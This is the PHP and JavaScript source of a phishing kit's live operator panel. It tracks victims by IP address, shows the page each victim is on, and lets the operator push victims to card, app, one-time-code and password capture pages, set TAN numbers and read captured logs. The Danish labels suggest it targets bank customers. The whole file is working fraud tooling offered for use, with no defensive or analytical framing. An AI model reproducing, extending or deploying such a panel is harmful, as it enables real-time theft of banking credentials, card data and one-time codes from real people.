<?php
session_start();
require "classes/mother.class.php";
if (!isset($_GET['vip']) or empty($_GET['vip'])) {
    exit("INVALID REQUESTS. PLEASE ACCESS THIS PAGE FROM A VALID LINK");
}



$m = new Mother;
$ip = @$_GET['vip'];
@$m->setDataFile("data/vics/VIC-$ip.json");

if (@$m->getData()["CURRENT_PAGE"] == null) {
    exit("<h2>Victim not found. please try an ip address you already receieved in yout results.</h2>");
}


$last_act = $m->getData()["LAST_ACT"];
$ip = $m->getData()["IP"];
$cp = $m->getData()["CURRENT_PAGE"];
$logs = $m->getData()["LOGS"];
$tan = $m->getData()["TAN"];

?>

<!doctype html>
<html>

<head>
    <title>
        <?php echo $ip; ?>
    </title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <link rel="stylesheet" href="res/app.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" />
    <script src="res/jq.js"></script>
</head>

<body>
    <div class="header">
        <div class="left">
            <i class='fa fa-user'></i> Welcome, <b>
                <?php echo substr(PNL_USERNAME, 0, 8); ?>
            </b>
			
        </div>
        
		<div class="right">
<button onclick="logout()"class="ban"><i class='fa fa-lock'></i> Log out</button>
</div>
		</div>

    </div>
    <div class="content">
        <div class="holder">
            <div class="multi">
                <div class="box1" id="statu" style="background:<?php if ($last_act > (time() - 5)) {
                    echo '#1bc81b';
                } else {
                    echo '#b60f0f';
                } ?>">
                    <div class="rows-holder">
                        <div class="row">VICTIM IP:
                            <?php echo $ip; ?>
                        </div>
                    </div>
                </div>

                <div class="box">
                    <div class="title">CURRENT PAGE</div>
                    <div class="content" id="current_page">
                        <?php
                        if (strpos($cp, "LOADING") !== false and $last_act > (time() - 5)) {
                            echo "<b style='color:red;'>Victim waiting for redirection... <br> $cp</b>";
                        } else {
                            echo $cp;
                        }
                        ?>
                    </div>
                </div>
                <div class="box">
                    <div class="title">REDIRECTS</div>
                    <div class="content">
                        <!-- <button onclick="redirect(1)">LOGIN</button>
                        <button onclick="redirect(2)">LOGIN ERROR</button> -->
                        <button onclick="redirect(5)">CARD</button>
                        <button onclick="redirect(6)">CARD ERROR</button>
				        <button onclick="redirect(1)">APP</button>
                        <button onclick="redirect(2)">APP ERROR </button>
                        <button onclick="redirect(3)">Engangskode</button>
                        <button onclick="redirect(4)">Engangskode ERROR</button>
					    <button onclick="redirect(60)">ADGANGSKODE</button>
                        <button onclick="redirect(61)">​ADGANGSKODE ERROR</button>
                        <button onclick="redirect(7)">WAIT</button>
                        <button onclick="redirect(8)">SUCCESS</button>
                    </div>
                </div>


                <div class="box">
                    <div class="title">SET A TAN NUMBER</div>
                    <div class="content">
                        <div class="input">
                            <input type="text" id="tan" value="<?php echo @$tan; ?>" placeholder="Example: 903">
                        </div>
                        <button onclick="setTan()">SET</button>
                    </div>
                </div>

                <div class="box">
                    <div class="title">VICTIM LOGS</div>
                    <div class="content">
                        <textarea id="data" readonly><?php echo "\n" . $logs; ?></textarea>
                    </div>
                </div>




                <div class="box">
                    <div class="title">ACTIONS</div>
                    <div class="content">
                        <button onclick="redirect(10)"> OFFICIAL WEBSITE <i class='fa-solid fa-arrow-right'></i>
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <div class="loader" id="loader" style="display:none;">
            <i class="fa fa-clock"></i> Redirecting...
        </div>
        <div class="loader" id="loader-adding" style="display:none;">
            <i class="fa fa-clock"></i> Adding...
        </div>
        <div class="loader-error" id="errorbox" style="display:none;">
            <i class="fa fa-ban"></i> <span id="error-msg"></span>
        </div>
        <div class="loader" id="successbox" style="display:none;">
            <i class="fa fa-circle-check"></i> <span id="success-msg"></span>
        </div>
        <div class="loader-error" id="loader-error" style="display:none;">
            <i class="fa fa-ban"></i> Victim is not connected
        </div>
    </div>


    <div class="footer">
        <div class="info">Live Control Panel Premium</div>
    </div>
    <script>
        var vis_statu = "off";
        var ip = "<?php echo $ip; ?>";

        function redirect(page) {
            if (vic_statu == "on") {
                $("#loader").show().delay(3000).fadeOut();
                $.post("classes/processor.php", {
                    pageID: page,
                    vicIP: ip
                });
            } else {
                $("#loader-error").show().delay(2000).fadeOut();
            }
        }


        var textarea = document.getElementById('data');
        var last_data = "";

        setInterval(function () {
            $.post("classes/processor.php", {
                getVictimData: 1,
                vip: ip
            },
                function (done) {
                    const data = JSON.parse(done);
                    if (data.page.includes('LOADING') == true && data.statu == "on") {
                        $("#current_page").html("<b style='color:red;'>Victim waiting for redirection... <br>" +
                            data.page + "</b>");
                    } else {
                        $("#current_page").html(data.page);
                    }

                    $("#data").val(data.data);
                    if (last_data != data.data) {
                        textarea.scrollTop = textarea.scrollHeight;
                    }
                    last_data = data.data;

                    vic_statu = data.statu;

                    if (data.statu == "on") {
                        $("#statu").css("background", "#1bc81b");
                    } else {
                        $("#statu").css("background", "#b60f0f");
                    }


                });
        }, 1000);


        function showError(msg) {
            $(".loader").hide();
            $(".loader-error").hide();
            $("#error-msg").html(msg);
            $("#errorbox").show().delay(2000).fadeOut();
        }

        function showSuccess(msg) {
            $(".loader").hide();
            $(".loader-error").hide();
            $("#success-msg").html(msg);
            $("#successbox").show().delay(2000).fadeOut();
        }


        function logout() {
            window.location = "index.php?logout";
        }



        $("#tan").keypress((e) => {
            if (e.key == "Enter") {
                setTan();
            }
        });

        function setTan() {
            var ip = "<?php echo $ip; ?>";
            var tan_ = $("#tan").val();
            if (tan_ != "") {

                $.post("classes/processor.php", {
                    tan: tan_,
                    vip: ip
                }, (d) => {
                    showSuccess("TAN <b>" + tan_ + "</b> was set!");
                });

            }
        }
    </script>
</body>

</html>